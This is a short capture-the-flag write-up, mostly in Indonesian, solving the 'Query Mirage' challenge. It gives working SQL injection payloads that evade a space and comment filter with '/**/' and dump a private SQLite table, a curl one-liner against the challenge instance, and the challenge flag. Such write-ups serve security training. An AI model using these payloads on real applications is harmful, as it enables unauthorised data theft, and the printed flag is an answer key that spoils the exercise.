# Query Mirage — SOLVED

**Flag:** `athena{aYACCcepXwWsKexk}`

- **Target:** `http://13.206.57.188:10052` (instance) — Flask/Werkzeug + SQLite
- **Vuln:** SQL injection di search endpoint `GET /?q=<term>`

## Recon
- `/` → `{"message":"Query Mirage notes portal."}`
- `/?q=a` → nyari notes (kolom `title`, `body`), balikin JSON array.
- Query di-append `ORDER BY 1`, DB = **SQLite** (dari error message).

## WAF / filter (di-block)
- spasi ` `
- tab `\t`
- `--` (comment)

Keyword `UNION`/`SELECT`/`FROM`/`WHERE` **tidak** di-block.

## Bypass
- Ganti spasi dengan comment inline `/**/`.
- Karena `--` di-block (gak bisa comment sisa query), tutup string yang trailing (`%'`)
  dengan cara ngakhirin payload di dalam string literal → `... LIKE '<x>'` ketutup jadi `'%'`.

## Payloads
Template kira-kira: `SELECT title, body FROM notes WHERE title LIKE '%<q>%' ORDER BY 1`

1. Konfirmasi UNION 2 kolom:
   ```
   q=zzz%'/**/UNION/**/SELECT/**/1,'
   ```
2. List tables:
   ```
   q=zzz%'/**/UNION/**/SELECT/**/name,sql/**/FROM/**/sqlite_master/**/WHERE/**/name/**/LIKE/**/'
   ```
   → nemu table `private_notes`.
3. Dump private_notes:
   ```
   q=zzz%'/**/UNION/**/SELECT/**/title,body/**/FROM/**/private_notes/**/WHERE/**/'%'/**/LIKE/**/'
   ```
   → `{"title":"admin memo","body":"athena{aYACCcepXwWsKexk}"}`

## curl one-liner
```bash
curl -s -G "http://13.206.57.188:10052/" \
  --data-urlencode "q=zzz%'/**/UNION/**/SELECT/**/title,body/**/FROM/**/private_notes/**/WHERE/**/'%'/**/LIKE/**/'"
```
